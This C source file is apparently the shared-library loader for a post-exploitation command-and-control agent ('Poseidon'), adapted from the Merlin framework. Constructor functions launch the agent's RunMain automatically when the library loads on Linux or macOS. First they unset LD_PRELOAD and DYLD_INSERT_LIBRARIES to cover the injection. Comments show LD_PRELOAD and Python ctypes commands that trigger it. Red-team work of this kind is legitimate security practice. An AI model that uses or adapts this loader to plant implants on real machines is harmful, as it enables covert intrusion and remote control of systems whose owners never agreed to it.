// This code is borrowed and slightly modified from https://github.com/MythicAgents/merlin/blob/efde48c42ed6dc364258698ef3a49009c684dd9f/Payload_Type/merlin/agent/merlin.c
// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2023 Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

#ifdef __linux__

// Test SO execution
// LD_PRELOAD=/home/itsafeature/Downloads/poseidon.so /usr/bin/whoami

#include <stdlib.h>

extern void* RunMain();

static void __attribute__ ((constructor)) init(void);

static void init(void) {
   // Thanks to the Sliver team for the unsetenv reminder
    unsetenv("LD_PRELOAD");
    unsetenv("LD_PARAMS");
    RunMain();
    return;
}

#elif __APPLE__

// Test Dylib execution with python3
// python3
// import ctypes
// ctypes.CDLL("./poseidon.dylib")

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <wchar.h>
#include <assert.h>
#include <pthread.h>

extern void* RunMain();

__attribute__ ((constructor)) void initializer()
{
    // Thanks to the Sliver team for the unsetenv reminder
    unsetenv("DYLD_INSERT_LIBRARIES");
    unsetenv("LD_PARAMS");

	pthread_attr_t  attr;
    pthread_t       posixThreadID;
    int             returnVal;

    returnVal = pthread_attr_init(&attr);
    assert(!returnVal);
    returnVal = pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    assert(!returnVal);
    pthread_create(&posixThreadID, &attr, &RunMain, NULL);
}

#endif